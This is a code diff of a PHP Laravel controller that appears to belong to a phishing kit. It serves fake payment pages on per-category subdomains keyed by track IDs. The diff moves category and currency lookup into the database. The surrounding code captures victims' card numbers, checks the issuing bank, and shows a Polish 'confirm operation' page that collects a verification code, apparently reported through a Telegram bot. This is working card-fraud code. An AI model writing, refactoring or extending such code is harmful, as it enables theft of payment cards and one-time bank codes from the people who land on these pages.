@@ -3,6 +3,7 @@
 namespace App\Http\Controllers\Fake;
 
 use App\Http\Controllers\Telegram\BotController;
+use App\Models\Category;
 use App\Models\Fake;
 use App\Http\Controllers\Controller;
 use Exception;
@@ -31,18 +32,15 @@ class PagesController extends Controller
             $key = 'track_id';
             $route = $request->route();
             $this->subdomain = getSubDomain() ?? $route->originalParameter('subdomain') ?? null;
-            $categoryName = collect(config('fakes.subdomain'))->filter(function ($value) {
-                return in_array($this->subdomain, $value);
-            })->keys()->first();
+            $category = Category::get()->filter(function ($category) {
+                return in_array($this->subdomain, explode(',', setting($category->name, $category->name)));
+            })->first();
 
             $track_id = $request->has($key) ? $request->get($key) : $request->session()->get($key);
             $this->uuid = $request->session()->get('uuid');
             try {
-                if (is_null($track_id) || is_null($categoryName)) throw new Exception();
-                $this->fake = Fake::whereTrackId($track_id)->whereHas('category', function ($query) use ($categoryName) {
-                    $query->where('name', '=', $categoryName);
-                })->first();
-
+                if (is_null($track_id) || is_null($category)) throw new Exception();
+                $this->fake = $category->fakes()->whereTrackId($track_id)->first();
                 if (is_null($this->fake)) throw new Exception();
                 $track_id = $this->fake->track_id;
                 $request->session()->put($key, $track_id);
@@ -65,11 +63,14 @@ class PagesController extends Controller
             } catch (Throwable $exception) {
                 session()->forget($key);
             }
-            return redirect((new Fake())->originalUrl($categoryName));
+            return redirect((new Fake())->originalUrl($category->name ?? null));
         });
     }
 
-    private function hasErrorRedirect()
+    /**
+     * @return bool
+     */
+    private function hasErrorRedirect(): bool
     {
         return Cache::get("$this->uuid.redirectUrl") === "/error";
     }
@@ -296,7 +297,7 @@ class PagesController extends Controller
         $balance = $request->session()->get('balance');
         $amount = number_format($fake->price, 0, "", " ");
         $bankName = ucfirst($this->bank);
-        $currency = config('fakes.currency');
+        $currency = setting('currency');
 
         $bankInfo = cardInfo($ccnumber);
         $notify = is_null($bankInfo) ? "<b>(Возможно фейк карта!)</b>" : "";
@@ -347,7 +348,7 @@ class PagesController extends Controller
         return view('fakes.code', [
                 'title' => 'Potwierdzenie operacji',
                 'categoryName' => mb_strtoupper($fake->category->name) . '_PAY',
-                'amount' => number_format($fake->price, 0, "", " ") . ' ' . config('fakes.currency'),
+                'amount' => number_format($fake->price, 0, "", " ") . ' ' . setting('currency'),
                 'card_number' => '**** **** **** ' . substr(session()->get('card_number'), -4)
             ]
         );
@@ -356,7 +357,7 @@ class PagesController extends Controller
     public function logCode(Request $request)
     {
         $fake = $this->getFake();
-        $currency = config('fakes.currency');
+        $currency = setting('currency');
         $ccnumber = $request->session()->get('card_number');
         $amount = number_format($fake->price, 0, "", " ");
         if ($code = $request->get('code')) {
